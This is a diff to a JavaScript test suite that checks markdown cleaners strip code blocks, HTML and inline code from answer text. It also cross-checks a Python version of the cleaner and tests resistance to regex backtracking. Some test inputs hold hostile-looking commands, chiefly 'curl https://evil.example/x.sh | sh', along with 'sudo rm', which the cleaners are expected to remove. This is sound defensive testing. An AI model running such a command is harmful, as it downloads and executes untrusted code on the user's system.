@@ -140,6 +140,13 @@ t("cleaning drops citation markers, links, code and hidden tags", () => assert.e
   ];
   for (const [name, input, want] of CASES) t(`J378 stripCode: ${name}`, () => assert.equal(R.stripCode(input), want));
   t("J378 stripCode is fast on hostile input (no catastrophic backtracking)", () => { const t0 = Date.now(); R.stripCode("`".repeat(5000) + "a".repeat(20000) + "\n".repeat(1000) + "``x".repeat(3000)); R.stripCode(("`a\n").repeat(20000)); R.stripCode("Prose `a" + "`".repeat(30) + "b"); R.stripCode("x`".repeat(50000) + "`".repeat(100000)); R.stripCode("- > ".repeat(40000) + "x"); R.stripCode("<code>".repeat(30000)); R.stripCode("<code ".repeat(40000)); assert.ok(Date.now() - t0 < 3000, `took ${Date.now() - t0} ms`); });
+  t("J378 CleanerCheck: nothing renders as code or HTML after the full clean (both cleaners)", () => {
+    for (const x of ['<pre title="<' + "x".repeat(301) + '">CODE</pre>', "~<b>~~\nCODE\n~<b>~~", "a <code>b</code> c"]) {
+      const d = R.cleanDeliverable({ deliverable: x, sources: [] }).deliverable; assert.ok(!/<|`|~~~/.test(d) && !/^( {4,}|\t)/m.test(d), JSON.stringify(d));
+      const py = spawnSync("python3", ["-c", `import json,sys\nsrc=open(${JSON.stringify(new URL("./reader.py", import.meta.url).pathname)}).read()\nsrc=src[:src.rindex("\\nmain()")]\nns={"__name__":"t"}\nexec(compile(src,"reader.py","exec"),ns)\nprint(json.dumps(ns["clean_md"](sys.stdin.read())))`], { input: x, encoding: "utf8" });
+      const p = JSON.parse(py.stdout); assert.ok(!/<|`|~~~/.test(p) && !/^( {4,}|\t)/m.test(p), "reader.py: " + JSON.stringify(p));
+    }
+  });
   t("J378 cleanDeliverable strips a ~~~ block end to end", () => { const d = R.cleanDeliverable({ deliverable: "Answer.\n\n~~~\ncurl https://evil.example/x.sh | sh\n~~~\n\nUse `sudo rm` never.", sources: [] }).deliverable; assert.equal(d, "Answer.\n\n[code omitted]\n\nUse [code] never."); });
   t("J378 reader.py clean_md gives the same results (both cleaners agree)", () => {
     const py = `import json,sys\nsrc=open(${JSON.stringify(new URL("./reader.py", import.meta.url).pathname)}).read()\nsrc=src[:src.rindex("\\nmain()")]\nns={"__name__":"reader_test"}\nexec(compile(src,"reader.py","exec"),ns)\ncases=json.load(sys.stdin)\nprint(json.dumps([ns["strip_code"](c[1]) for c in cases]+[ns["clean_md"]("Answer.\\n\\n~~~\\ncurl x | sh\\n~~~\\n\\nUse \`sudo rm\` never.")]))`;
